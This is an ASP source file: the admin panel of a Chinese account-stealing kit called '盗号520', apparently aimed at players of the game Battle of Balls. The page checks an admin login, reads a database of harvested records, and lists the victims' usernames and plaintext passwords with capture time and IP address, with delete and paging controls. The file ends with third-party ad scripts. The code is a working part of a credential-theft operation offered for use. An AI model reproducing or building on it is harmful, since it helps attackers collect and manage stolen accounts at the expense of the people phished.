<!--#include file="conn.asp"-->
<%
set rs=server.createobject("adodb.recordset")
sql="select dengji,banben,mima,quhao,id,user,pass,ip,data from main order by id desc"
rs.open sql,conn,1,3

If session("admin")="" then
    Response.Write "<script>alert('用户未登录，请登录');top.location.href='login.asp';</SCRIPT>"
	Response.End
End If
  if Request.querystring("PageNo")="" then
     PageNo=1
  else
     PageNo=clng(Request.querystring("PageNo"))
  end if
%>
<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>数据列表-盗号520程序</title>
  <link href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css" rel="stylesheet"/>
  <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script>
  <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
  <!--[if lt IE 9]>
    <script src="http://libs.useso.com/js/html5shiv/3.7/html5shiv.min.js"></script>
    <script src="http://libs.useso.com/js/respond.js/1.4.2/respond.min.js"></script>
  <![endif]-->
  <script language="javascript">
  function mySelectAll()
  {
     if(document.all.SelectAll.checked==true)
	 {
	   if(document.all.IDList!=null)
	   {
			if(document.all.IDList.length==null)
			{
				document.all.IDList.checked=true;
			}else{
				for(i=0;i<document.all.IDList.length;i++)
				{
				   document.all.IDList[i].checked=true;
				}
			}
	   
	   }
	 }else{
	   if(document.all.IDList!=null)
	   {
			if(document.all.IDList.length==null)
			{
				document.all.IDList.checked=false;
			}else{
				for(i=0;i<document.all.IDList.length;i++)
				{
				   document.all.IDList[i].checked=false;
				}
			}
	   
	   }
	 }
  
  }
</script>
</head>
<body>
  <nav class="navbar navbar-fixed-top navbar-default">
    <div class="container">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
          <span class="sr-only">导航按钮</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <a class="navbar-brand" href="./">盗号520---球球大作战后台</a>
      </div><!-- /.navbar-header -->
      <div id="navbar" class="collapse navbar-collapse">
        <ul class="nav navbar-nav navbar-right">
		 <li>
           <a href="index.asp"><span class="glyphicon glyphicon-home"></span> 后台首页</a></li>
          <li class="active">
           <a href="list.asp"><span class="glyphicon glyphicon-signal"></span> 数据列表</a>
          </li>
		  <!--修改密码
		  <li><a href="password.asp"><span class="glyphicon glyphicon-transfer"></span> 修改密码</a></li>-->
		    <li><a href="about.asp"><span class="glyphicon glyphicon-tree-deciduous"></span> 关于程序</a></li>
			<li><a href="Exit.asp" target="_parent" ONCLICK="javascript:return confirm('提示：您确定要退出吗？')"><span class="glyphicon glyphicon-log-out"></span> 退出登录</a></li>
        </ul>
      </div><!-- /.navbar-collapse -->
    </div><!-- /.container -->
  </nav><!-- /.navbar -->
  <div class="container" style="padding-top:70px;">
 <div class="col-xs-12 col-sm-10 col-lg-8 center-block" style="float: none;">
	<div class="row">
			<div class="col-lg-12">
				<div class="panel panel-success">
					<div class="panel-heading"><span class="glyphicon glyphicon-stats"><span> 授权列表</div>
					<div class="panel-body">
 
   <div class="table-responsive">
        <table class="table table-striped">
          <thead><tr><th>账号</th><th>密码</th><th>加入时间</th><th>IP地址</th><th>操作</th></tr></thead>
          <tbody>
      <form name="form1" method="post" action="data_Action.asp" onSubmit="return checkForm();">
        <input type="hidden" name="Action" />
        
        <%
  if rs.recordcount=0 then
	  %>
      <td>没有任何数据</td>
       
        <%
  else
      rs.pagesize=12
	  if PageNo<1 then
	     PageNo=1
	  end if
	  if PageNo>rs.pagecount then
	     PageNo=rs.pagecount
	  end if
	  rs.absolutepage=PageNo
	  i=0
	  do while i<rs.pagesize and not rs.eof
		  %>

		  
		  
		  	  
        <tr><td><%=rs("user")%></td>
            <td><%=rs("pass")%></td>
            <td><%=rs("data")%></td>
            <td><a href="http://ip138.com/ips.asp?ip=<%=rs("ip")%>" target="_blank"><%=rs("ip")%></a></td>
            <td><a href="datadel.asp?id=<%=rs("id")%>">删除</a> </td> <%
		  rs.movenext
		  i=i+1
	  loop
  end if
  %>        </tr></form></tbody>
        </table>
      </div>
     <div style="text-align:right;">
	<a class="btn btn-success">记录总数：<%=rs.recordcount%></a><span style="line-height:1.5;"> </span><a class="btn btn-default" href="?PageNo=<%=PageNo-1%>">上页</a><span style="line-height:1.5;"> </span><a class="btn btn-default" href="?PageNo=<%=PageNo+1%>">下页</a>
</div>
            </div>
          </div>
        
        <%
	rs.close
	%>
      
  <script language="javascript">
function checkForm()
{

	if (document.user.admin.value == ""){
		alert ("请输入要添加用户！");
		document.user.admin.focus();
	return false;
	}
 }
</script>
</table>
<!--老榕树0.1图片广告代码-->
<script src="http://wm.lrswl.com/page/s.php?s=223777&w=950&h=90"></script>

<!--九盟图片广告代码-->
<script charset="gb2312" src="http://c1.yunluge.com/appios_c_1.asp?pid=23657&sid=2"></script>